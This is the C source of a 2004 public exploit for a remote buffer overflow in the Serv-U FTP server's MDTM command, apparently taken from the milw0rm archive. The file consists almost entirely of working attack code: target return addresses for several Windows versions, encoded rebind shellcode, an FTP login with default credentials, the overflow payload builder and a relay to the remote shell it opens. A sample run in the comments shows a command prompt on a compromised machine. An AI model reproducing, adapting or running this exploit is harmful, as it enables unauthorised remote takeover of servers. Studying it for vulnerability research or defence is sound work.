/* ex_servu.c - Serv-U FTPD 3.x/4.x/5.x \"MDTM\" Command remote overflow exploit
*
* Copyright (c) SST 2004 All rights reserved.
*
* Public version
*
* BUG find by bkbll (bkbll@cnhonker.com), cool! :ppPPppPPPpp :D
*
* code by Sam and  2004/01/07
*      <chen_xiaobo@venustech.com.cn>
*                     <Sam@0x557.org>
*                    
*
* Revise History:
*      2004/01/14 add rebind shellcode :> we can bind shellport at ftpd port.
*      2004/01/09 connect back shellcode added :)
*      2004/01/08 21:04 upgrade now :), we put shellcode in file parameter
*       we can attack pacthed serv-U;PPPp by airsupply
*  2004/01/08 change shellcode working on serv-u 4.0/4.1/4.2 now 
*      :D thx airsupply
*
* Compile: gcc -o ex_servu ex_servu.c
*
* how works?
* [root@core exp]# ./sv -h 192.168.10.119 -t 3
* Serv-U FTPD 3.x/4.x MDTM Command remote overflow exploit
* bug find by bkbll (bkbll@cnhonker.com) code by Sam (Sam@0x557.org)
*
* # Connecting......
*  [+] Connected.
*  [*] USER ftp .
*  [*] 10 bytes send.
*  [*] PASS sst@SERV-u .
*  [*] 17 bytes send.
*  [+] login success .
*  [+] remote version: Serv-U v4.x with Windows XP EN SP1
*  [+] trigger vulnerability !
*   [+] 1027 bytes overflow strings sent!
*  [+] successed!!
*
*
*  Microsoft Windows XP [Version 5.1.2600]
*  (C) Copyright 1985-2001 Microsoft Corp.
*
*  [Sam Chen@SAM C:\\]#
*
*
* some thanks/greets to:
* bkbll (he find this bug :D), airsupply, kkqq, icbm
* and everyone else who\'s KNOW SST;P
* http://0x557.org
*/

#include <stdio.h>
#include <unistd.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/time.h>

#define VER \"v5.0\"

#define clearbit(buff)          bzero(buff, sizeof (buff));
#define padding(buff, a)        memset(buff, a, sizeof (buff));

#define MAX_LEN         2048
#define MAX_NUM         4

int     x = 0, port = 21, shellport;
char    pass[20], user[20];

struct archs {
       char            *desc;
       unsigned int    magic;

}architectures[] = {


       {
               \"Serv-U v3.x/4.x/5.x  with Windows 2K CN\",   //winmm.dll
               0x77535985

       },
        {
               \"Serv-U v3.x/4.x/5.x  with Windows 2K BIG5 version\",   //winmm.dll
                0x77531790

       },
       {
               \"Serv-U v3.x/4.x/5.x  with Windows 2K EN\",
               0x77575985

       },

       {
               \"Serv-U v3.x/4.x/5.x  with Windows XP CN SP1\",
               0x76b12f69

       },
       {
               \"Serv-U v3.x/4.x/5.x  with Windows XP EN SP1\",
               0x76b42a3a

}

};

char decoder [] =
/* 36 bytes cool decoder by airsupply :) */

\"\\x90\\x90\\x90\\x5E\\x5F\\x5B\\xBE\\x52\\x52\\x49\\x41\\x46\\xBF\\x52\\x52\\x31\"
\"\\x41\\x47\\x43\\x39\\x3B\\x75\\xFB\\x4B\\x80\\x33\\x99\\x39\\x73\\xFC\\x75\\xF7\"
\"\\xFF\\xD3\\x90\\x90\";

/* fork + rebind shellcode  by airsupply (one way shellcode) */
char    shellcode [] =

\"\\x53\\x52\\x49\\x41\"

/*port offset 120 + 4*/
\"\\xFD\\x38\\xA9\\x99\\x99\\x99\\x12\\xD9\\x95\\x12\\xD9\\x85\\x12\\x99\\x12\\xD9\"
\"\\x91\\x18\\x75\\x19\\x98\\x99\\x99\\x12\\x65\\x12\\x76\\x32\\x70\\x8B\\x9B\\x99\"
\"\\x99\\xC7\\xAA\\x50\\x28\\x90\\x66\\xEE\\x65\\x71\\xB9\\x98\\x99\\x99\\xF1\\xF5\"
\"\\xF5\\x99\\x99\\xF1\\xAA\\xAB\\xB7\\xFD\\xF1\\xEE\\xEA\\xAB\\xC6\\xCD\\x66\\xCC\"
\"\\x9D\\x32\\xAA\\x50\\x28\\x9C\\x66\\xEE\\x65\\x71\\x99\\x98\\x99\\x99\\x12\\x6C\"
\"\\x71\\x94\\x98\\x99\\x99\\xAA\\x66\\x18\\x75\\x09\\x98\\x99\\x99\\xCD\\xF1\\x98\"
\"\\x98\\x99\\x99\\x66\\xCF\\xB5\\xC9\\xC9\\xC9\\xC9\\xD9\\xC9\\xD9\\xC9\\x66\\xCF\"
\"\\xA9\\x12\\x41\\xCE\\xCE\\xF1\\x9B\\x99\\x8C\\x5B\\x12\\x55\\xCA\\xC8\\xF3\\x8F\"
\"\\xC8\\xCA\\x66\\xCF\\xAD\\xC0\\xC2\\x1C\\x59\\xEC\\x68\\xCE\\xCA\\x66\\xCF\\xA1\"
\"\\xCE\\xC8\\xCA\\x66\\xCF\\xA5\\x12\\x49\\x10\\x1F\\xD9\\x98\\x99\\x99\\xF1\\xFC\"
\"\\xE1\\xFC\\x99\\xF1\\xFA\\xF4\\xFD\\xB7\\x10\\x3F\\xA9\\x98\\x99\\x99\\x1A\\x75\"
\"\\xCD\\x14\\xA5\\xBD\\xAA\\x59\\xAA\\x50\\x1A\\x58\\x8C\\x32\\x7B\\x64\\x5F\\xDD\"
\"\\xBD\\x89\\xDD\\x67\\xDD\\xBD\\xA5\\x67\\xDD\\xBD\\xA4\\x10\\xCD\\xBD\\xD1\\x10\"
\"\\xCD\\xBD\\xD5\\x10\\xCD\\xBD\\xC9\\x14\\xDD\\xBD\\x89\\x14\\x27\\xDD\\x98\\x99\"
\"\\x99\\xCE\\xC9\\xC8\\xC8\\xC8\\xD8\\xC8\\xD0\\xC8\\xC8\\x66\\x2F\\xA9\\x98\\x99\"
\"\\x99\\xC8\\x66\\xCF\\x91\\xAA\\x59\\xD1\\xC9\\x66\\xCF\\x95\\xCA\\xCC\\xCF\\xCE\"
\"\\x12\\xF5\\xBD\\x81\\x12\\xDC\\xA5\\x12\\xCD\\x9C\\xE1\\x9A\\x4C\\x12\\xD3\\x81\"
\"\\x12\\xC3\\xB9\\x9A\\x44\\x7A\\xA9\\xD0\\x12\\xAD\\x12\\x9A\\x6C\\xAA\\x66\\x65\"
\"\\xAA\\x59\\x35\\xA3\\x79\\xED\\x9E\\x58\\x56\\x9E\\x9A\\x61\\x72\\x6B\\xA2\\xE5\"
\"\\xBD\\x8D\\xEC\\x78\\x12\\xC3\\xBD\\x9A\\x44\\xFF\\x12\\x95\\xD2\\x12\\xC3\\x85\"
\"\\x9A\\x44\\x12\\x9D\\x12\\x9A\\x5C\\xC6\\xC7\\xC4\\xC2\\x5B\\x9D\\x99\\xC8\\x66\"
\"\\xED\\xBD\\x91\\x34\\xC9\\x71\\x3B\\x66\\x66\\x66\\x1A\\x5D\\x9D\\xC0\\x32\\x7B\"
\"\\x74\\x5A\\xF1\\xFC\\xE1\\xFC\\x99\\xF1\\xFA\\xF4\\xFD\\xB7\\x10\\x3F\\xA9\\x98\"
\"\\x99\\x99\\x1A\\x75\\xCD\\x14\\xA5\\xBD\\xAA\\x59\\xAA\\x50\\x1A\\x58\\x8C\\x32\"
\"\\x7B\\x64\\x5F\\xDD\\xBD\\x89\\xDD\\x67\\xDD\\xBD\\xA5\\x67\\xDD\\xBD\\xA4\\x10\"
\"\\xDD\\xBD\\xD1\\x10\\xDD\\xBD\\xD5\\x10\\xDD\\xBD\\xC9\\x14\\xDD\\xBD\\x89\\x14\"
\"\\x27\\xDD\\x98\\x99\\x99\\xCE\\xC9\\xC8\\xC8\\xF3\\x9D\\xC8\\xC8\\xC8\\x66\\x2F\"
\"\\xA9\\x98\\x99\\x99\\xC8\\x66\\xCF\\x91\\x18\\x75\\x99\\x9D\\x99\\x99\\xF1\\x9E\"
\"\\x99\\x98\\x99\\xCD\\x66\\x2F\\xD1\\x98\\x99\\x99\\x66\\xCF\\x89\\xF3\\xD9\\xF1\"
\"\\x99\\x89\\x99\\x99\\xF1\\x99\\xC9\\x99\\x99\\xF3\\x99\\x66\\x2F\\xDD\\x98\\x99\"
\"\\x99\\x66\\xCF\\x8D\\x10\\x1D\\xBD\\x21\\x99\\x99\\x99\\x10\\x1D\\xBD\\x2D\\x99\"
\"\\x99\\x99\\x12\\x15\\xBD\\xF9\\x9D\\x99\\x99\\x5E\\xD8\\x62\\x09\\x09\\x09\\x09\"
\"\\x5F\\xD8\\x66\\x09\\x1A\\x70\\xCC\\xF3\\x99\\xF1\\x99\\x89\\x99\\x99\\xC8\\xC9\"
\"\\x66\\x2F\\xDD\\x98\\x99\\x99\\x66\\xCF\\x81\\xCD\\x66\\x2F\\xD1\\x98\\x99\\x99\"
\"\\x66\\xCF\\x85\\x66\\x2F\\xD1\\x98\\x99\\x99\\x66\\xCF\\xB9\\xAA\\x59\\xD1\\xC9\"
\"\\x66\\xCF\\x95\\x71\\x70\\x64\\x66\\x66\\xAB\\xED\\x08\\x95\\x50\\x25\\x3F\\xF2\"
\"\\x16\\x6B\\x81\\xF8\\x51\\xCE\\xD6\\x88\\x68\\xE2\\x05\\x76\\xC1\\x96\\xD8\\x0E\"
\"\\x51\\xCE\\xD6\\x8E\\x4F\\x15\\x07\\x6A\\xFA\\x10\\x48\\xD6\\xA4\\xF3\\x2D\\x19\"
\"\\xB4\\xAB\\xE1\\x47\\xFD\\x89\\x3E\\x44\\x95\\x06\\x4A\\xD2\\x28\\x87\\x0E\\x98\"
\"\\x06\\x06\\x06\\x06\"
\"\\x53\\x52\\x31\\x41\";


/* new:
* tcp connect with no block socket, host to ip.
* millisecond timeout, it\'s will be fast.
*;D
* 2003/06/23 add by Sam
*/
int new_tcpConnect (char *host, unsigned int port, unsigned int timeout)
{
       int                     sock,
                               flag,
                               pe = 0;
       size_t                  pe_len;
       struct timeval          tv;
       struct sockaddr_in      addr;
       struct hostent*         hp = NULL;
       fd_set                  rset;

       // reslov hosts
       hp = gethostbyname (host);
       if (NULL == hp) {
               perror (\"tcpConnect:gethostbyname\\n\");
               return -1;
       }

       sock = socket (AF_INET, SOCK_STREAM, 0);
       if (-1 == sock) {
               perror (\"tcpConnect:socket\\n\");
               return -1;
       }

       addr.sin_addr = *(struct in_addr *) hp->h_addr;
       addr.sin_family = AF_INET;
       addr.sin_port = htons (port);

       /* set socket no block
        */
       flag = fcntl (sock, F_GETFL);
       if (-1 == flag) {
               perror (\"tcpConnect:fcntl\\n\");
               close (sock);
               return -1;
       }

       flag |= O_NONBLOCK;
       if (fcntl (sock, F_SETFL, flag) < 0) {
               perror (\"tcpConnect:fcntl\\n\");
               close (sock);
               return -1;
       }

       if (connect (sock, (const struct sockaddr *) &addr,
                           sizeof(addr)) < 0 &&
           errno != EINPROGRESS) {
               perror (\"tcpConnect:connect\\n\");
               close (sock);
               return -1;
       }

       /* set connect timeout
        * use millisecond
        */
       tv.tv_sec = timeout/1000;
       tv.tv_usec = timeout%1000;

       FD_ZERO (&rset);
       FD_SET (sock, &rset);

       if (select (sock+1, &rset, &rset, NULL, &tv) <= 0) {
//                perror (\"tcpConnect:select\");
               close (sock);
               return -1;
       }

       pe_len = sizeof (pe);

       if (getsockopt (sock, SOL_SOCKET, SO_ERROR, &pe, &pe_len) < 0) {
               perror (\"tcpConnect:getsockopt\\n\");
               close (sock);
               return -1;
       }

       if (pe != 0) {
               errno = pe;
               close (sock);
               return -1;
       }

       if (fcntl(sock, F_SETFL, flag&~O_NONBLOCK) < 0) {
               perror (\"tcpConnect:fcntl\\n\");
               close (sock);
               return -1;
       }

       pe = 1;
       pe_len = sizeof (pe);

       if (setsockopt (sock, IPPROTO_TCP, TCP_NODELAY, &pe, pe_len) < 0){
               perror (\"tcpConnect:setsockopt\\n\");
               close (sock);
               return -1;
       }

       return sock;
}

/* rip code, from hsj */
int sh (int in, int out, int s)
{
       char    sbuf[128], rbuf[128];
       int     i,
               ti, fd_cnt,
               ret=0, slen=0, rlen=0;
       fd_set  rd, wr;

       fd_cnt = in > out ? in : out;
       fd_cnt = s > fd_cnt ? s : fd_cnt;
       fd_cnt ++;

       for (;;) {
               FD_ZERO (&rd);
               if (rlen < sizeof (rbuf))
                       FD_SET (s, &rd);
               if (slen < sizeof (sbuf))
                       FD_SET (in, &rd);

               FD_ZERO (&wr);
               if (slen)
                       FD_SET (s, &wr);
               if (rlen)
                       FD_SET (out, &wr);

               if ((ti = select (fd_cnt, &rd, &wr, 0, 0)) == (-1))
                       break;
               if (FD_ISSET (in, &rd)) {
                       if((i = read (in, (sbuf+slen),
                       (sizeof (sbuf) - slen))) == (-1)) {
                               ret = -2;
                               break;
                       }
                       else if (i == 0) {
                               ret = -3;
                               break;
                       }
                       slen += i;
                       if (!(--ti))
                               continue;
               }
               if (FD_ISSET (s, &wr)) {
                       if ((i = write (s, sbuf, slen)) == (-1))
                               break;
                       if (i == slen)
                               slen = 0;
                       else {
                               slen -= i;
                               memmove (sbuf, sbuf + i, slen);
                       }
                       if (!(--ti))
                               continue;
               }
               if (FD_ISSET (s, &rd)) {
                       if ((i = read (s, (rbuf + rlen),
                       (sizeof (rbuf) - rlen))) <= 0)
                               break;
                       rlen += i;
                       if (!(--ti))
                               continue;
               }
               if (FD_ISSET (out, &wr)) {
                       if ((i = write (out, rbuf, rlen)) == (-1))
                               break;
                       if (i == rlen)
                               rlen = 0;
                       else {
                               rlen -= i;
                               memmove (rbuf, rbuf+i, rlen);
                       }
               }
       }
       return ret;
}


int new_send (int fd, char *buff, size_t len)
{
       int     ret;

       if ((ret = send (fd, buff, len, 0)) <= 0) {
               perror (\"new_write\");
               return -1;
       }

       return ret;

}

int new_recv (int fd, char *buff, size_t len)
{
       int     ret;

       if ((ret = recv (fd, buff, len, 0)) <= 0) {
               perror (\"new_recv\");
               return -1;
       }

       return ret;
}

int ftp_login (char *hostName, short port, char *user, char *pass)
{
       int     ret, sock;
       char    buff[MAX_LEN];

       fprintf (stderr, \"# Connecting...... \\n\");
       if ((sock = new_tcpConnect (hostName, port, 4000)) <= 0) {
               fprintf (stderr, \"[-] failed. \\n\");
               return -1;
       }

       clearbit (buff);

       new_recv (sock, buff, sizeof (buff) - 1);
       if (!strstr (buff, \"220\")) {
               fprintf (stderr, \"[-] failed. \\n\");
               return -1;
       }
       fprintf (stderr, \"[+] Connected. \\n\");

       sleep (1);
       fprintf (stderr, \"[*] USER %s .\\n\", user);
       clearbit (buff);
       snprintf (buff, sizeof (buff), \"USER %s\\r\\n\",  user);
       ret = new_send (sock, buff, strlen (buff));
       fprintf (stderr, \"[*] %d bytes send. \\n\", ret);

       sleep (1);

       clearbit (buff);
       new_recv (sock, buff, sizeof (buff) - 1);
       if (!strstr (buff, \"331\")) {
               fprintf (stderr, \"[-] user failed. \\n%s\\n\", buff);
               return -1;
       }

       fprintf (stderr, \"[*] PASS %s .\\n\", pass);
       clearbit (buff);
       snprintf (buff, sizeof (buff), \"PASS %s\\r\\n\", pass);
       ret = new_send (sock, buff, strlen (buff));
       fprintf (stderr, \"[*] %d bytes send. \\n\", ret);

       sleep (1);

       clearbit (buff);
       new_recv (sock, buff, sizeof (buff) - 1);
       if (!strstr (buff, \"230\")) {
               fprintf (stderr, \"[-] pass failed. \\n%s\\n\", buff);
               return -1;
       }

       fprintf (stderr, \"[+] login success .\\n\");

       return sock;

}

void do_overflow (int sock)
{
       int             ret, i;
       unsigned short newport;
       char    Comand [MAX_LEN] = {0}, chmodBuffer [600], rbuf[256];

       clearbit (Comand);
       clearbit (rbuf);

       clearbit (chmodBuffer);
       
       for(i = 0; i < 47; i++) 
        strcat(chmodBuffer, \"a\");
for(i = 0; i < 16; i += 8) {
        *(unsigned int*)&chmodBuffer[47+i] = 0x06eb9090;
        *(unsigned int*)&chmodBuffer[51+i] = architectures[x].magic; //0x1002bd78;  //pop reg pop reg ret
}


newport = htons (shellport)^(unsigned short)0x9999;
memcpy (&shellcode[120 + 4], &newport, 2);

 strcat(chmodBuffer, decoder);
 

       fprintf (stderr, \"[+] remote version: %s\\n\", architectures[x].desc);

       fprintf (stderr, \"[+] trigger vulnerability !\\n \");
       strcpy (Comand, \"MDTM 20031111111111+\");
       strncat (Comand, chmodBuffer, strlen (chmodBuffer) - 1);
       strcat (Comand, \" \");


       strcat (Comand, shellcode);
      
       strcat (Comand, \"hacked_by.sst\\r\\n\");

       ret =  new_send (sock, Comand, strlen (Comand));
       fprintf (stderr, \"[+] %d bytes overflow strings sent!\\n\", ret);


       return;
}

/* print help messages.
* just show ya how to use.
*/
void showHELP (char *p)
{
       int     i;

       fprintf (stderr, \"Usage: %s [Options] \\n\", p);
       fprintf (stderr, \"Options:\\n\"
               \"\\t-h [remote host]\\tremote host\\n\"
               \"\\t-P [server port]\\tserver port\\n\"
               \"\\t-t [system type]\\tchoice the system type\\n\"
               \"\\t-u [user   name]\\tlogin with this username\\n\"
               \"\\t-p [pass   word]\\tlogin with this passwd\\n\"
               \"\\t-d [shell  port]\\trebind using this port (default: ftpd port)\\n\\n\");


       printf (\"num . description\\n\");
       printf (\"----+-----------------------------------------------\"
               \"--------\\n\");
       for (i = 0; i <= MAX_NUM; i ++) {
               printf (\"%3d | %s\\n\", i, architectures[i].desc);
       }
       printf (\"    \'\\n\");
       return;
}

int main (int c, char *v[])
{
       int             ch, fd, sd;
       char     *hostName = NULL, *userName = \"ftp\", *passWord = \"sst@SERV-u\";
       shellport  = port;
       

       fprintf (stderr, \"Serv-U FTPD 3.x/4.x/5.x MDTM Command remote overflow exploit \"VER\"\\n\"
               \"bug find by bkbll (bkbll@cnhonker.net) code by Sam (Sam@0x557.org)\\n\\n\");

       if (c < 2) {
               showHELP (v[0]);
               exit (1);
       }

       while((ch = getopt(c, v, \"h:t:u:p:P:c:d:\")) != EOF) {
               switch(ch) {
                       case \'h\':
                               hostName = optarg;
                               break;
                       case \'t\':
                               x = atoi (optarg);
                               if (x > MAX_NUM) {
                                       printf (\"[-] wtf your input?\\n\");
                                       exit (-1);
                               }
                               break;
                       case \'u\':
                               userName = optarg;
                               break;
                       case \'p\':
                               passWord = optarg;
                               break;
                       case \'P\':
                        port = atoi (optarg);
                        break;
                       case \'d\':
                        shellport = atoi (optarg);
                        break;
                       default:
                               showHELP (v[0]);
                               return 0;
               }
       }


       fd = ftp_login (hostName, port, userName, passWord);
       if (fd <= 0) {
               printf (\"[-] can\'t connnect\\n\");
               exit (-1);
       }

       do_overflow (fd);

close (fd);
 
       sleep (3);
      
       sd = new_tcpConnect (hostName, shellport, 3000);
       if (sd <= 0) {
               printf (\"[-] failed\\n\");
               return -1;
       }

       fprintf (stderr, \"[+] successed!!\\n\\n\\n\");
       sh (0, 1, sd);

       close (sd);

       return 0;
}



// milw0rm.com [2004-02-27]
